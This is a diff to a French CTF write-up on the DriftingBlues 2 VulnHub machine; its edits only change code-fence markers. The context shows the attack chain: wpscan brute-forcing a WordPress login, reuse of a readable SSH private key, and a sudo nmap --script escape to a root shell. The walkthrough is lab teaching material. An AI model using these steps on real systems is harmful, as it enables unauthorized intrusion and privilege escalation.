@@ -8,7 +8,7 @@ Intro
 
 Après [le précédent opus]({% link _posts/2022-01-19-Solution-du-CTF-DriftingBlues-1-de-VulnHub.md %}) j'attaque donc ce second épisode des CTF DriftingBlues, toujours téléchargeable sur VulnHub  
 
-```plain
+```
 PORT   STATE SERVICE VERSION 
 21/tcp open  ftp     ProFTPD 
 | ftp-anon: Anonymous FTP login allowed (FTP code 230) 
@@ -32,7 +32,7 @@ Une recherche d'image inversée nous apprend que le guitariste est *Otis Rush*. 
 Utiliser les outils de stéganographie est souvent une plaie. Le code est ancien et ne compile pas forcément sur des machines récentes. J'ai trouvé [une image Docker](https://hub.docker.com/r/dominicbreuker/stego-toolkit)
  qui contient les binaires utiles, c'est l'occasion d'essayer :  
 
-```plain
+```
 $ docker run -it --rm -v $(pwd):/data dominicbreuker/stego-toolkit /bin/bash
 root@eb06c29f1622:/data# stegdetect secret.jpg  
 secret.jpg : negative
@@ -47,7 +47,7 @@ Via énumération sur le serveur web on trouve très vite un Wordpress à l'adre
 
 Vu que j'avais du temps AFK j'ai lancé wpscan pour bruteforcer le compte avec la wordlist rockyou :  
 
-```plain
+```
 $ docker run -v /tools/wordlists/:/data -it --rm wpscanteam/wpscan --url http://192.168.56.7/blog/ -U albert -P /data/rockyou.txt
 --- snip ---
 [!] Valid Combinations Found: 
@@ -69,13 +69,13 @@ Mercury
 
 Un des premiers réflexes est de regarder le fichier */etc/passwd* qui nous renseigne sur les utilisateurs présents :  
 
-```plain
+```
 freddie:x:1000:1000:freddie,,,:/home/freddie:/bin/bash
 ```
 
 Cet utilisateur dispose du flag *user.txt* qui ne nous est pas lisible. En revanche sa clé privée SSH l'est !  
 
-```plain
+```
 www-data@driftingblues:/var/www/html/blog$ ssh -i /home/freddie/.ssh/id_rsa freddie@127.0.0.1 
 Could not create directory '/var/www/.ssh'. 
 load pubkey "/home/freddie/.ssh/id_rsa": Permission denied 
@@ -119,7 +119,7 @@ flag 1/2
 GTFO
 ----
 
-```plain
+```
 freddie@driftingblues:~$ sudo -l 
 Matching Defaults entries for freddie on driftingblues: 
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin 
@@ -130,7 +130,7 @@ User freddie may run the following commands on driftingblues:
 
 *Freddie* peut utiliser Nmap en tant que root sans donner de mot de passe. Pratique mais faillible [d'après GTFObins](https://gtfobins.github.io/gtfobins/nmap/) :  
 
-```plain
+```
 freddie@driftingblues:~$ echo 'os.execute("/bin/sh")' > command.py
 freddie@driftingblues:~$ sudo /usr/bin/nmap --script=command.py 
 Starting Nmap 7.70 ( https://nmap.org ) at 2022-01-19 13:30 CST 
